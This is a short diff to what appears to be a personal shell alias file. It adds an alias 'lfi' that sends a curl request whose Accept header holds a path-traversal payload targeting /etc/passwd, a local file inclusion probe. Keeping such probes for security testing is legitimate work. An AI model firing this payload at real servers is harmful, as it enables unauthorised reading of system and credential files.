@@ -114,6 +114,7 @@ alias dl="cd ~/Downloads"
 alias dt="cd ~/Desktop"
 alias fl="bundle exec fastlane"
 alias up="cd .."
+alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{'"
 
 # JAVA
 alias JAVA_HOME='/usr/libexec/java_home'
